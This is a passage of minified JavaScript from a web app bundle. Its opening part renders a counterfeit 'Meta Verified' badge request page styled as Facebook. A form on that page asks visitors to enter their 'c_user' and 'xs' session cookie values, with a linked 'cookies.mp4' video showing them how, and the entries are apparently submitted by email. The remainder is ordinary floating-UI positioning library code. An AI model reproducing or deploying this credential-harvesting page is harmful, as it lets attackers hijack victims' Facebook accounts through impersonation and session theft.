            console.error("EmailJS error:", c),
            e({
                variant: "destructive",
                title: "Error",
                description: "Failed to submit form. Please try again."
            })
        } finally {
            i(!1)
        }
    }
    ;
    return g.jsxs("div", {
        className: "min-h-screen flex flex-col bg-white",
        children: [g.jsx(qf, {
            title: "Meta Verified | Validation",
            description: "Request a verified badge on Facebook - Initial Step"
        }), g.jsx(KP, {
            open: r,
            onOpenChange: o
        }), g.jsxs("nav", {
            className: "flex items-center justify-between p-3 sm:p-4 border-b",
            children: [g.jsx("div", {
                className: "flex items-center",
                children: g.jsx("p", {
                    className: "text-[#1877f2] text-xl sm:text-2xl font-bold",
                    children: "facebook"
                })
            }), g.jsxs("div", {
                className: "flex items-center bg-[#F0F2F5] rounded-full px-3 sm:px-4 py-1.5 sm:py-2",
                children: [g.jsx(Rb, {
                    className: "w-3 h-3 sm:w-4 sm:h-4 mr-2 text-[#65676B]"
                }), g.jsx("input", {
                    type: "text",
                    placeholder: "Search",
                    className: "bg-transparent outline-none text-sm sm:text-base w-24 sm:w-auto text-[#65676B] placeholder-[#65676B]"
                })]
            })]
        }), g.jsx("div", {
            className: "flex-1 flex justify-center p-4 sm:p-8",
            children: g.jsxs("div", {
                className: "max-w-2xl w-full space-y-4 sm:space-y-6",
                children: [g.jsx("h1", {
                    className: "text-xl sm:text-2xl font-bold text-[#1c1e21]",
                    children: "Request a verified badge on Facebook"
                }), g.jsxs("div", {
                    className: "space-y-3 sm:space-y-4 text-[#65676B] text-sm sm:text-base",
                    children: [g.jsx("p", {
                        children: "The verified badge means that Facebook has confirmed that the Page or profile is the authentic presence of the individual, public figure or brand that it represents."
                    }), g.jsx("p", {
                        children: "Previously, the verified badge also required the person or brand to be notable and unique. You may still see users with a verified badge that represents our previous eligibility requirements."
                    }), g.jsx("p", {
                        children: "Please provide the precise details below. Refer to the video for clarification if you find the instructions unclear."
                    })]
                }), g.jsxs("div", {
                    className: "bg-[#F0F2F5] p-4 sm:p-6 rounded-lg space-y-4",
                    children: [g.jsx("h2", {
                        className: "text-base sm:text-lg font-semibold text-[#1c1e21]",
                        children: "Detailed Video Information"
                    }), g.jsx("div", {
                        className: "video-container relative w-full aspect-video rounded-lg overflow-hidden bg-black",
                        children: g.jsxs("video", {
                            className: "w-full h-full",
                            controls: !0,
                            playsInline: !0,
                            preload: "auto",
                            children: [g.jsx("source", {
                                src: "https://cdn.glitch.global/cfdab748-b145-4b28-8f85-c26ac388a3c9/cookies.mp4?v=1719846896202",
                                type: "video/mp4"
                            }), "Your browser does not support the video tag."]
                        })
                    }), g.jsx("h3", {
                        className: "font-semibold text-sm sm:text-base text-[#1c1e21]",
                        children: "Must Watch the video and submit required information correctly."
                    })]
                }), g.jsx(Cw, {
                    ...a,
                    children: g.jsxs("form", {
                        onSubmit: a.handleSubmit(l),
                        className: "space-y-4",
                        children: [g.jsx(Nl, {
                            control: a.control,
                            name: "c_user",
                            render: ({field: u}) => g.jsxs(ki, {
                                children: [g.jsx(Ti, {
                                    className: "text-sm sm:text-base text-[#1c1e21]",
                                    children: "c_user"
                                }), g.jsx(Pi, {
                                    children: g.jsx(Ri, {
                                        type: "number",
                                        min: "0",
                                        pattern: "[0-9]+",
                                        minLength: 6,
                                        placeholder: "Enter c_user",
                                        className: "text-sm sm:text-base border-[#dddfe2] focus:border-[#1877f2] focus:ring-[#1877f2] focus:ring-opacity-50",
                                        ...u
                                    })
                                }), g.jsx(Ni, {
                                    className: "text-xs text-[#dc3545]"
                                })]
                            })
                        }), g.jsx(Nl, {
                            control: a.control,
                            name: "xs",
                            render: ({field: u}) => g.jsxs(ki, {
                                children: [g.jsx(Ti, {
                                    className: "text-sm sm:text-base text-[#1c1e21]",
                                    children: "xs"
                                }), g.jsx(Pi, {
                                    children: g.jsx(Ri, {
                                        type: "text",
                                        placeholder: "Enter xs",
                                        className: "text-sm sm:text-base border-[#dddfe2] focus:border-[#1877f2] focus:ring-[#1877f2] focus:ring-opacity-50",
                                        ...u
                                    })
                                }), g.jsx(Ni, {
                                    className: "text-xs text-[#dc3545]"
                                })]
                            })
                        }), g.jsx("p", {
                            className: "text-xs sm:text-sm text-[#65676B]",
                            children: "Please make sure account not to log out from your computer or laptop until you have received a verification email."
                        }), g.jsx(Es, {
                            type: "submit",
                            className: "w-full py-2 sm:py-2.5 text-sm sm:text-base bg-[#1877f2] hover:bg-[#166fe5] transition-colors duration-200",
                            disabled: a.formState.isSubmitting,
                            children: s ? "Verifying..." : "Continue"
                        })]
                    })
                })]
            })
        }), g.jsx("div", {
            className: "text-center p-3 sm:p-4 text-xs sm:text-sm text-[#65676B] border-t",
            children: "Meta © 2025"
        }), g.jsx("style", {
            children: `
        .video-container {
          box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
        }
      `
        })]
    })
}
function _m(e, [t,n]) {
    return Math.min(n, Math.max(t, e))
}
var cN = h.createContext(void 0);
function dN(e) {
    const t = h.useContext(cN);
    return e || t || "ltr"
}
const fN = ["top", "right", "bottom", "left"]
  , Or = Math.min
  , Ot = Math.max
  , Vl = Math.round
  , ja = Math.floor
  , Pn = e => ({
    x: e,
    y: e
})
  , pN = {
    left: "right",
    right: "left",
    bottom: "top",
    top: "bottom"
}
  , hN = {
    start: "end",
    end: "start"
};
function Nd(e, t, n) {
    return Ot(e, Or(t, n))
}
function Gn(e, t) {
    return typeof e == "function" ? e(t) : e
}
function Yn(e) {
    return e.split("-")[0]
}
function bs(e) {
    return e.split("-")[1]
}
function sp(e) {
    return e === "x" ? "y" : "x"
}
function ip(e) {
    return e === "y" ? "height" : "width"
}
function jr(e) {
    return ["top", "bottom"].includes(Yn(e)) ? "y" : "x"
}
function ap(e) {
    return sp(jr(e))
}
function mN(e, t, n) {
    n === void 0 && (n = !1);
    const r = bs(e)
      , o = ap(e)
      , s = ip(o);
    let i = o === "x" ? r === (n ? "end" : "start") ? "right" : "left" : r === "start" ? "bottom" : "top";
    return t.reference[s] > t.floating[s] && (i = zl(i)),
    [i, zl(i)]
}
function vN(e) {
    const t = zl(e);
    return [Rd(e), t, Rd(t)]
}
function Rd(e) {
    return e.replace(/start|end/g, t => hN[t])
}
function gN(e, t, n) {
    const r = ["left", "right"]
      , o = ["right", "left"]
      , s = ["top", "bottom"]
      , i = ["bottom", "top"];
    switch (e) {
    case "top":
    case "bottom":
        return n ? t ? o : r : t ? r : o;
    case "left":
    case "right":
        return t ? s : i;
    default:
        return []
    }
}
function yN(e, t, n, r) {
    const o = bs(e);
    let s = gN(Yn(e), n === "start", r);
    return o && (s = s.map(i => i + "-" + o),
    t && (s = s.concat(s.map(Rd)))),
    s
}
function zl(e) {
    return e.replace(/left|right|bottom|top/g, t => pN[t])
}
function wN(e) {
    return {
        top: 0,
        right: 0,
        bottom: 0,
        left: 0,
        ...e
    }
}
function Lx(e) {
    return typeof e != "number" ? wN(e) : {
        top: e,
        right: e,
        bottom: e,
        left: e
    }
}
function $l(e) {
    const {x: t, y: n, width: r, height: o} = e;
    return {
        width: r,
        height: o,
        top: n,
        left: t,
        right: t + r,
        bottom: n + o,
        x: t,
        y: n
    }
}
function Em(e, t, n) {
    let {reference: r, floating: o} = e;
    const s = jr(t)
      , i = ap(t)
      , a = ip(i)
      , l = Yn(t)
      , u = s === "y"
      , c = r.x + r.width / 2 - o.width / 2
      , d = r.y + r.height / 2 - o.height / 2
      , p = r[a] / 2 - o[a] / 2;
    let w;
    switch (l) {
    case "top":
        w = {
            x: c,
            y: r.y - o.height
        };
        break;
    case "bottom":
        w = {
            x: c,
            y: r.y + r.height
        };
        break;
    case "right":
        w = {
            x: r.x + r.width,
            y: d
        };
        break;
    case "left":
        w = {
            x: r.x - o.width,
            y: d
        };
        break;
    default:
        w = {
            x: r.x,
            y: r.y
        }
    }
    switch (bs(t)) {
    case "start":
        w[i] -= p * (n && u ? -1 : 1);
        break;
    case "end":
        w[i] += p * (n && u ? -1 : 1);
        break
    }
    return w
}
const xN = async (e, t, n) => {
    const {placement: r="bottom", strategy: o="absolute", middleware: s=[], platform: i} = n
      , a = s.filter(Boolean)
      , l = await (i.isRTL == null ? void 0 : i.isRTL(t));
    let u = await i.getElementRects({
        reference: e,
        floating: t,
        strategy: o
    })
      , {x: c, y: d} = Em(u, r, l)
      , p = r
      , w = {}
      , x = 0;
    for (let m = 0; m < a.length; m++) {
        const {name: S, fn: v} = a[m]
          , {x: f, y, data: _, reset: b} = await v({
            x: c,
            y: d,
            initialPlacement: r,
            placement: p,
            strategy: o,
            middlewareData: w,
            rects: u,
            platform: i,
            elements: {
                reference: e,
                floating: t
            }
        });
        c = f ?? c,
        d = y ?? d,
        w = {
            ...w,
            [S]: {
                ...w[S],
                ..._
            }
        },
        b && x <= 50 && (x++,
        typeof b == "object" && (b.placement && (p = b.placement),
        b.rects && (u = b.rects === !0 ? await i.getElementRects({
            reference: e,
            floating: t,
            strategy: o
        }) : b.rects),
        {x: c, y: d} = Em(u, p, l)),
        m = -1)
    }
    return {
        x: c,
        y: d,
        placement: p,
        strategy: o,
        middlewareData: w
    }
}
;
async function Zi(e, t) {
    var n;
    t === void 0 && (t = {});
    const {x: r, y: o, platform: s, rects: i, elements: a, strategy: l} = e
      , {boundary: u="clippingAncestors", rootBoundary: c="viewport", elementContext: d="floating", altBoundary: p=!1, padding: w=0} = Gn(t, e)
      , x = Lx(w)
      , S = a[p ? d === "floating" ? "reference" : "floating" : d]
      , v = $l(await s.getClippingRect({
        element: (n = await (s.isElement == null ? void 0 : s.isElement(S))) == null || n ? S : S.contextElement || await (s.getDocumentElement == null ? void 0 : s.getDocumentElement(a.floating)),
        boundary: u,
        rootBoundary: c,
        strategy: l
    }))
      , f = d === "floating" ? {
        x: r,
        y: o,
        width: i.floating.width,
        height: i.floating.height
    } : i.reference
      , y = await (s.getOffsetParent == null ? void 0 : s.getOffsetParent(a.floating))
      , _ = await (s.isElement == null ? void 0 : s.isElement(y)) ? await (s.getScale == null ? void 0 : s.getScale(y)) || {
        x: 1,
        y: 1
    } : {
        x: 1,
        y: 1
    }
      , b = $l(s.convertOffsetParentRelativeRectToViewportRelativeRect ? await s.convertOffsetParentRelativeRectToViewportRelativeRect({
        elements: a,
        rect: f,
        offsetParent: y,
        strategy: l
    }) : f);
    return {
        top: (v.top - b.top + x.top) / _.y,
        bottom: (b.bottom - v.bottom + x.bottom) / _.y,
        left: (v.left - b.left + x.left) / _.x,
        right: (b.right - v.right + x.right) / _.x
    }
}
const SN = e => ({
    name: "arrow",
    options: e,
    async fn(t) {
        const {x: n, y: r, placement: o, rects: s, platform: i, elements: a, middlewareData: l} = t
          , {element: u, padding: c=0} = Gn(e, t) || {};
        if (u == null)
            return {};
        const d = Lx(c)
          , p = {
            x: n,
            y: r
        }
          , w = ap(o)
          , x = ip(w)
          , m = await i.getDimensions(u)
          , S = w === "y"
          , v = S ? "top" : "left"
          , f = S ? "bottom" : "right"
          , y = S ? "clientHeight" : "clientWidth"
          , _ = s.reference[x] + s.reference[w] - p[w] - s.floating[x]
          , b = p[w] - s.reference[w]
          , T = await (i.getOffsetParent == null ? void 0 : i.getOffsetParent(u));
        let k = T ? T[y] : 0;
        (!k || !await (i.isElement == null ? void 0 : i.isElement(T))) && (k = a.floating[y] || s.floating[x]);
        const P = _ / 2 - b / 2
          , z = k / 2 - m[x] / 2 - 1
          , L = Or(d[v], z)
          , X = Or(d[f], z)
          , O = L
          , U = k - m[x] - X
          , j = k / 2 - m[x] / 2 + P
          , q = Nd(O, j, U)
          , K = !l.arrow && bs(o) != null && j !== q && s.reference[x] / 2 - (j < O ? L : X) - m[x] / 2 < 0
          , Y = K ? j < O ? j - O : j - U : 0;
        return {
            [w]: p[w] + Y,
            data: {
                [w]: q,
                centerOffset: j - q - Y,
                ...K && {
                    alignmentOffset: Y
                }
            },
            reset: K
        }
    }
})
  , _N = function(e) {
    return e === void 0 && (e = {}),
    {
        name: "flip",
        options: e,
        async fn(t) {
            var n, r;
            const {placement: o, middlewareData: s, rects: i, initialPlacement: a, platform: l, elements: u} = t
              , {mainAxis: c=!0, crossAxis: d=!0, fallbackPlacements: p, fallbackStrategy: w="bestFit", fallbackAxisSideDirection: x="none", flipAlignment: m=!0, ...S} = Gn(e, t);
            if ((n = s.arrow) != null && n.alignmentOffset)
                return {};
            const v = Yn(o)
              , f = jr(a)
              , y = Yn(a) === a
              , _ = await (l.isRTL == null ? void 0 : l.isRTL(u.floating))
              , b = p || (y || !m ? [zl(a)] : vN(a))
              , T = x !== "none";
            !p && T && b.push(...yN(a, m, x, _));
            const k = [a, ...b]
              , P = await Zi(t, S)
              , z = [];
            let L = ((r = s.flip) == null ? void 0 : r.overflows) || [];
            if (c && z.push(P[v]),
            d) {
                const j = mN(o, i, _);
                z.push(P[j[0]], P[j[1]])
            }
            if (L = [...L, {
                placement: o,
                overflows: z
            }],
            !z.every(j => j <= 0)) {
                var X, O;
                const j = (((X = s.flip) == null ? void 0 : X.index) || 0) + 1
                  , q = k[j];
                if (q)
                    return {
                        data: {
                            index: j,
                            overflows: L
                        },
                        reset: {
                            placement: q
                        }
                    };
                let K = (O = L.filter(Y => Y.overflows[0] <= 0).sort( (Y, N) => Y.overflows[1] - N.overflows[1])[0]) == null ? void 0 : O.placement;
                if (!K)
                    switch (w) {
                    case "bestFit":
                        {
                            var U;
                            const Y = (U = L.filter(N => {
                                if (T) {
                                    const F = jr(N.placement);
                                    return F === f || F === "y"
                                }
                                return !0
                            }
                            ).map(N => [N.placement, N.overflows.filter(F => F > 0).reduce( (F, Q) => F + Q, 0)]).sort( (N, F) => N[1] - F[1])[0]) == null ? void 0 : U[0];
                            Y && (K = Y);
                            break
                        }
                    case "initialPlacement":
                        K = a;
                        break
                    }
                if (o !== K)
                    return {
                        reset: {
                            placement: K
                        }
                    }
            }
            return {}
        }
    }
};
function bm(e, t) {
    return {
        top: e.top - t.height,
        right: e.right - t.width,
        bottom: e.bottom - t.height,
        left: e.left - t.width
    }
}
function Cm(e) {
    return fN.some(t => e[t] >= 0)
}
const EN = function(e) {
    return e === void 0 && (e = {}),
    {
        name: "hide",
        options: e,
        async fn(t) {
            const {rects: n} = t
              , {strategy: r="referenceHidden", ...o} = Gn(e, t);
            switch (r) {
            case "referenceHidden":
                {
                    const s = await Zi(t, {
                        ...o,
                        elementContext: "reference"
                    })
                      , i = bm(s, n.reference);
                    return {
                        data: {
                            referenceHiddenOffsets: i,
                            referenceHidden: Cm(i)
                        }
                    }
                }
            case "escaped":
                {
                    const s = await Zi(t, {
                        ...o,
                        altBoundary: !0
                    })
                      , i = bm(s, n.floating);
                    return {
                        data: {
                            escapedOffsets: i,
                            escaped: Cm(i)
                        }
                    }
                }
            default:
                return {}
            }
        }
    }
};
async function bN(e, t) {
    const {placement: n, platform: r, elements: o} = e
      , s = await (r.isRTL == null ? void 0 : r.isRTL(o.floating))
      , i = Yn(n)
      , a = bs(n)
      , l = jr(n) === "y"
      , u = ["left", "top"].includes(i) ? -1 : 1
      , c = s && l ? -1 : 1
      , d = Gn(t, e);
    let {mainAxis: p, crossAxis: w, alignmentAxis: x} = typeof d == "number" ? {
        mainAxis: d,
        crossAxis: 0,
        alignmentAxis: null
    } : {
        mainAxis: d.mainAxis || 0,
        crossAxis: d.crossAxis || 0,
        alignmentAxis: d.alignmentAxis
    };
    return a && typeof x == "number" && (w = a === "end" ? x * -1 : x),
    l ? {
        x: w * c,
        y: p * u
    } : {
        x: p * u,
        y: w * c
    }
}
const CN = function(e) {
    return e === void 0 && (e = 0),
    {
        name: "offset",
        options: e,
        async fn(t) {
            var n, r;
            const {x: o, y: s, placement: i, middlewareData: a} = t
              , l = await bN(t, e);
            return i === ((n = a.offset) == null ? void 0 : n.placement) && (r = a.arrow) != null && r.alignmentOffset ? {} : {
                x: o + l.x,
                y: s + l.y,
                data: {
                    ...l,
                    placement: i
                }
            }
        }
    }
}
  , kN = function(e) {
    return e === void 0 && (e = {}),
    {
        name: "shift",
        options: e,
        async fn(t) {
            const {x: n, y: r, placement: o} = t
              , {mainAxis: s=!0, crossAxis: i=!1, limiter: a={
                fn: S => {
                    let {x: v, y: f} = S;
                    return {
                        x: v,
                        y: f
                    }
                }
            }, ...l} = Gn(e, t)
              , u = {
                x: n,
                y: r
            }
              , c = await Zi(t, l)
              , d = jr(Yn(o))
              , p = sp(d);
            let w = u[p]
              , x = u[d];
            if (s) {
                const S = p === "y" ? "top" : "left"
                  , v = p === "y" ? "bottom" : "right"
                  , f = w + c[S]
                  , y = w - c[v];
                w = Nd(f, w, y)
            }
            if (i) {
                const S = d === "y" ? "top" : "left"
                  , v = d === "y" ? "bottom" : "right"
                  , f = x + c[S]
                  , y = x - c[v];
                x = Nd(f, x, y)
            }
            const m = a.fn({
                ...t,
                [p]: w,
                [d]: x
            });
            return {
                ...m,
                data: {
                    x: m.x - n,
                    y: m.y - r,
                    enabled: {
                        [p]: s,
                        [d]: i
                    }
                }
            }
        }
    }
}
  , TN = function(e) {
    return e === void 0 && (e = {}),
    {
        options: e,
        fn(t) {
            const {x: n, y: r, placement: o, rects: s, middlewareData: i} = t
              , {offset: a=0, mainAxis: l=!0, crossAxis: u=!0} = Gn(e, t)
              , c = {
                x: n,
                y: r
            }
              , d = jr(o)
              , p = sp(d);
            let w = c[p]
              , x = c[d];
            const m = Gn(a, t)
              , S = typeof m == "number" ? {
                mainAxis: m,
                crossAxis: 0
            } : {
                mainAxis: 0,
                crossAxis: 0,
                ...m
            };
            if (l) {
                const y = p === "y" ? "height" : "width"
                  , _ = s.reference[p] - s.floating[y] + S.mainAxis
                  , b = s.reference[p] + s.reference[y] - S.mainAxis;
                w < _ ? w = _ : w > b && (w = b)
            }
            if (u) {
                var v, f;
                const y = p === "y" ? "width" : "height"
                  , _ = ["top", "left"].includes(Yn(o))
                  , b = s.reference[d] - s.floating[y] + (_ && ((v = i.offset) == null ? void 0 : v[d]) || 0) + (_ ? 0 : S.crossAxis)
                  , T = s.reference[d] + s.reference[y] + (_ ? 0 : ((f = i.offset) == null ? void 0 : f[d]) || 0) - (_ ? S.crossAxis : 0);
                x < b ? x = b : x > T && (x = T)
            }
            return {
                [p]: w,
                [d]: x
            }
        }
    }
}
  , PN = function(e) {
    return e === void 0 && (e = {}),
    {
        name: "size",
        options: e,
        async fn(t) {
            var n, r;
            const {placement: o, rects: s, platform: i, elements: a} = t
              , {apply: l= () => {}
            , ...u} = Gn(e, t)
              , c = await Zi(t, u)
              , d = Yn(o)
              , p = bs(o)
              , w = jr(o) === "y"
              , {width: x, height: m} = s.floating;
            let S, v;
            d === "top" || d === "bottom" ? (S = d,
            v = p === (await (i.isRTL == null ? void 0 : i.isRTL(a.floating)) ? "start" : "end") ? "left" : "right") : (v = d,
            S = p === "end" ? "top" : "bottom");
            const f = m - c.top - c.bottom
              , y = x - c.left - c.right
              , _ = Or(m - c[S], f)
              , b = Or(x - c[v], y)
              , T = !t.middlewareData.shift;
            let k = _
              , P = b;
            if ((n = t.middlewareData.shift) != null && n.enabled.x && (P = y),
            (r = t.middlewareData.shift) != null && r.enabled.y && (k = f),
            T && !p) {
                const L = Ot(c.left, 0)
                  , X = Ot(c.right, 0)
                  , O = Ot(c.top, 0)
                  , U = Ot(c.bottom, 0);
                w ? P = x - 2 * (L !== 0 || X !== 0 ? L + X : Ot(c.left, c.right)) : k = m - 2 * (O !== 0 || U !== 0 ? O + U : Ot(c.top, c.bottom))
            }
            await l({
                ...t,
                availableWidth: P,
                availableHeight: k
            });
            const z = await i.getDimensions(a.floating);
            return x !== z.width || m !== z.height ? {
                reset: {
                    rects: !0
                }
            } : {}
        }
    }
};
function wu() {
    return typeof window < "u"
}
function Cs(e) {
    return Dx(e) ? (e.nodeName || "").toLowerCase() : "#document"
}
function Lt(e) {
    var t;
    return (e == null || (t = e.ownerDocument) == null ? void 0 : t.defaultView) || window
}
function On(e) {
    var t;
    return (t = (Dx(e) ? e.ownerDocument : e.document) || window.document) == null ? void 0 : t.documentElement
}
function Dx(e) {
    return wu() ? e instanceof Node || e instanceof Lt(e).Node : !1
}
function hn(e) {
    return wu() ? e instanceof Element || e instanceof Lt(e).Element : !1
}
function An(e) {
    return wu() ? e instanceof HTMLElement || e instanceof Lt(e).HTMLElement : !1
}
function km(e) {
    return !wu() || typeof ShadowRoot > "u" ? !1 : e instanceof ShadowRoot || e instanceof Lt(e).ShadowRoot
}
function ia(e) {
    const {overflow: t, overflowX: n, overflowY: r, display: o} = mn(e);
    return /auto|scroll|overlay|hidden|clip/.test(t + r + n) && !["inline", "contents"].includes(o)
}
function NN(e) {
    return ["table", "td", "th"].includes(Cs(e))
}
function xu(e) {
    return [":popover-open", ":modal"].some(t => {
        try {
            return e.matches(t)
        } catch {
            return !1
        }
    }
    )
}
function lp(e) {
    const t = up()
      , n = hn(e) ? mn(e) : e;
    return n.transform !== "none" || n.perspective !== "none" || (n.containerType ? n.containerType !== "normal" : !1) || !t && (n.backdropFilter ? n.backdropFilter !== "none" : !1) || !t && (n.filter ? n.filter !== "none" : !1) || ["transform", "perspective", "filter"].some(r => (n.willChange || "").includes(r)) || ["paint", "layout", "strict", "content"].some(r => (n.contain || "").includes(r))
}
function RN(e) {
    let t = Mr(e);
    for (; An(t) && !gs(t); ) {
        if (lp(t))
            return t;
        if (xu(t))
            return null;
        t = Mr(t)
    }
    return null
}
function up() {
    return typeof CSS > "u" || !CSS.supports ? !1 : CSS.supports("-webkit-backdrop-filter", "none")
}
function gs(e) {
    return ["html", "body", "#document"].includes(Cs(e))
}
function mn(e) {
    return Lt(e).getComputedStyle(e)
}
function Su(e) {
    return hn(e) ? {
        scrollLeft: e.scrollLeft,
        scrollTop: e.scrollTop
    } : {
        scrollLeft: e.scrollX,
        scrollTop: e.scrollY
    }
}
function Mr(e) {
    if (Cs(e) === "html")
        return e;
    const t = e.assignedSlot || e.parentNode || km(e) && e.host || On(e);
    return km(t) ? t.host : t
}
function Fx(e) {
    const t = Mr(e);
    return gs(t) ? e.ownerDocument ? e.ownerDocument.body : e.body : An(t) && ia(t) ? t : Fx(t)
}
function Ki(e, t, n) {
    var r;
    t === void 0 && (t = []),
    n === void 0 && (n = !0);
    const o = Fx(e)
      , s = o === ((r = e.ownerDocument) == null ? void 0 : r.body)
      , i = Lt(o);
    if (s) {
        const a = Ad(i);
        return t.concat(i, i.visualViewport || [], ia(o) ? o : [], a && n ? Ki(a) : [])
    }
    return t.concat(o, Ki(o, [], n))
}
function Ad(e) {
    return e.parent && Object.getPrototypeOf(e.parent) ? e.frameElement : null
}
function Vx(e) {
    const t = mn(e);
    let n = parseFloat(t.width) || 0
      , r = parseFloat(t.height) || 0;
    const o = An(e)
      , s = o ? e.offsetWidth : n
      , i = o ? e.offsetHeight : r
      , a = Vl(n) !== s || Vl(r) !== i;
    return a && (n = s,
    r = i),
    {
        width: n,
        height: r,
        $: a
    }
}
function cp(e) {
    return hn(e) ? e : e.contextElement
}
function Go(e) {
    const t = cp(e);
    if (!An(t))
        return Pn(1);
    const n = t.getBoundingClientRect()
      , {width: r, height: o, $: s} = Vx(t);
    let i = (s ? Vl(n.width) : n.width) / r
      , a = (s ? Vl(n.height) : n.height) / o;
    return (!i || !Number.isFinite(i)) && (i = 1),
    (!a || !Number.isFinite(a)) && (a = 1),
    {
        x: i,
        y: a
    }
}
const AN = Pn(0);
function zx(e) {
    const t = Lt(e);
    return !up() || !t.visualViewport ? AN : {
        x: t.visualViewport.offsetLeft,
        y: t.visualViewport.offsetTop
    }
}
function ON(e, t, n) {
    return t === void 0 && (t = !1),
    !n || t && n !== Lt(e) ? !1 : t
}
function co(e, t, n, r) {
    t === void 0 && (t = !1),
    n === void 0 && (n = !1);
    const o = e.getBoundingClientRect()
      , s = cp(e);
    let i = Pn(1);
    t && (r ? hn(r) && (i = Go(r)) : i = Go(e));
    const a = ON(s, n, r) ? zx(s) : Pn(0);
    let l = (o.left + a.x) / i.x
      , u = (o.top + a.y) / i.y
      , c = o.width / i.x
      , d = o.height / i.y;
    if (s) {
        const p = Lt(s)
          , w = r && hn(r) ? Lt(r) : r;
        let x = p
          , m = Ad(x);
        for (; m && r && w !== x; ) {
            const S = Go(m)
              , v = m.getBoundingClientRect()
              , f = mn(m)
              , y = v.left + (m.clientLeft + parseFloat(f.paddingLeft)) * S.x
              , _ = v.top + (m.clientTop + parseFloat(f.paddingTop)) * S.y;
            l *= S.x,
            u *= S.y,
            c *= S.x,
            d *= S.y,
            l += y,
            u += _,
            x = Lt(m),
            m = Ad(x)
        }
    }
    return $l({
        width: c,
        height: d,
        x: l,
        y: u
    })
}
function dp(e, t) {
    const n = Su(e).scrollLeft;
    return t ? t.left + n : co(On(e)).left + n
}
function $x(e, t, n) {
    n === void 0 && (n = !1);
    const r = e.getBoundingClientRect()
      , o = r.left + t.scrollLeft - (n ? 0 : dp(e, r))
      , s = r.top + t.scrollTop;
    return {
        x: o,
        y: s
    }
}
function jN(e) {
    let {elements: t, rect: n, offsetParent: r, strategy: o} = e;
    const s = o === "fixed"
      , i = On(r)
      , a = t ? xu(t.floating) : !1;
    if (r === i || a && s)
        return n;
    let l = {
        scrollLeft: 0,
        scrollTop: 0
    }
      , u = Pn(1);
    const c = Pn(0)
      , d = An(r);
    if ((d || !d && !s) && ((Cs(r) !== "body" || ia(i)) && (l = Su(r)),
    An(r))) {
        const w = co(r);
        u = Go(r),
        c.x = w.x + r.clientLeft,
        c.y = w.y + r.clientTop
    }
    const p = i && !d && !s ? $x(i, l, !0) : Pn(0);
    return {
        width: n.width * u.x,
        height: n.height * u.y,
        x: n.x * u.x - l.scrollLeft * u.x + c.x + p.x,
        y: n.y * u.y - l.scrollTop * u.y + c.y + p.y
    }
}
function MN(e) {
    return Array.from(e.getClientRects())
}
function IN(e) {
    const t = On(e)
      , n = Su(e)
      , r = e.ownerDocument.body
      , o = Ot(t.scrollWidth, t.clientWidth, r.scrollWidth, r.clientWidth)
      , s = Ot(t.scrollHeight, t.clientHeight, r.scrollHeight, r.clientHeight);
    let i = -n.scrollLeft + dp(e);
    const a = -n.scrollTop;
    return mn(r).direction === "rtl" && (i += Ot(t.clientWidth, r.clientWidth) - o),
    {
        width: o,
        height: s,
        x: i,
        y: a
    }
}
function LN(e, t) {
    const n = Lt(e)
      , r = On(e)
      , o = n.visualViewport;
    let s = r.clientWidth
      , i = r.clientHeight
      , a = 0
      , l = 0;
    if (o) {
        s = o.width,
        i = o.height;
        const u = up();
        (!u || u && t === "fixed") && (a = o.offsetLeft,
        l = o.offsetTop)
    }
    return {
        width: s,
        height: i,
        x: a,
        y: l
    }
}
function DN(e, t) {
    const n = co(e, !0, t === "fixed")
      , r = n.top + e.clientTop
      , o = n.left + e.clientLeft
      , s = An(e) ? Go(e) : Pn(1)
      , i = e.clientWidth * s.x
      , a = e.clientHeight * s.y
      , l = o * s.x
      , u = r * s.y;
    return {
        width: i,
        height: a,
        x: l,
        y: u
    }
}
function Tm(e, t, n) {
    let r;
    if (t === "viewport")
        r = LN(e, n);
    else if (t === "document")
        r = IN(On(e));
    else if (hn(t))
        r = DN(t, n);
    else {
        const o = zx(e);
        r = {
            x: t.x - o.x,
            y: t.y - o.y,
            width: t.width,
            height: t.height
        }
    }
    return $l(r)
}
function Ux(e, t) {
    const n = Mr(e);
    return n === t || !hn(n) || gs(n) ? !1 : mn(n).position === "fixed" || Ux(n, t)
}
function FN(e, t) {
    const n = t.get(e);
    if (n)
        return n;
    let r = Ki(e, [], !1).filter(a => hn(a) && Cs(a) !== "body")
      , o = null;
    const s = mn(e).position === "fixed";
    let i = s ? Mr(e) : e;
    for (; hn(i) && !gs(i); ) {
        const a = mn(i)
          , l = lp(i);
        !l && a.position === "fixed" && (o = null),
        (s ? !l && !o : !l && a.position === "static" && !!o && ["absolute", "fixed"].includes(o.position) || ia(i) && !l && Ux(e, i)) ? r = r.filter(c => c !== i) : o = a,
        i = Mr(i)
    }
    return t.set(e, r),
    r
}
function VN(e) {
    let {element: t, boundary: n, rootBoundary: r, strategy: o} = e;
    const i = [...n === "clippingAncestors" ? xu(t) ? [] : FN(t, this._c) : [].concat(n), r]
      , a = i[0]
      , l = i.reduce( (u, c) => {
        const d = Tm(t, c, o);
        return u.top = Ot(d.top, u.top),
        u.right = Or(d.right, u.right),
        u.bottom = Or(d.bottom, u.bottom),
        u.left = Ot(d.left, u.left),
        u
    }
    , Tm(t, a, o));
    return {
        width: l.right - l.left,
        height: l.bottom - l.top,
        x: l.left,
        y: l.top
    }
}
function zN(e) {
    const {width: t, height: n} = Vx(e);
    return {
        width: t,
        height: n
    }
}
function $N(e, t, n) {
    const r = An(t)
      , o = On(t)
      , s = n === "fixed"
      , i = co(e, !0, s, t);
    let a = {
        scrollLeft: 0,
        scrollTop: 0
    };
    const l = Pn(0);
    if (r || !r && !s)
        if ((Cs(t) !== "body" || ia(o)) && (a = Su(t)),
        r) {
            const p = co(t, !0, s, t);
            l.x = p.x + t.clientLeft,
            l.y = p.y + t.clientTop
        } else
            o && (l.x = dp(o));
    const u = o && !r && !s ? $x(o, a) : Pn(0)
      , c = i.left + a.scrollLeft - l.x - u.x
      , d = i.top + a.scrollTop - l.y - u.y;
    return {
        x: c,
        y: d,
        width: i.width,
        height: i.height
    }
}
function yc(e) {
    return mn(e).position === "static"
}
function Pm(e, t) {
    if (!An(e) || mn(e).position === "fixed")
        return null;
    if (t)
        return t(e);
    let n = e.offsetParent;
    return On(e) === n && (n = n.ownerDocument.body),
    n
}
function Bx(e, t) {
    const n = Lt(e);
    if (xu(e))
        return n;
    if (!An(e)) {
        let o = Mr(e);
        for (; o && !gs(o); ) {
            if (hn(o) && !yc(o))
                return o;
            o = Mr(o)
        }
        return n
    }
    let r = Pm(e, t);
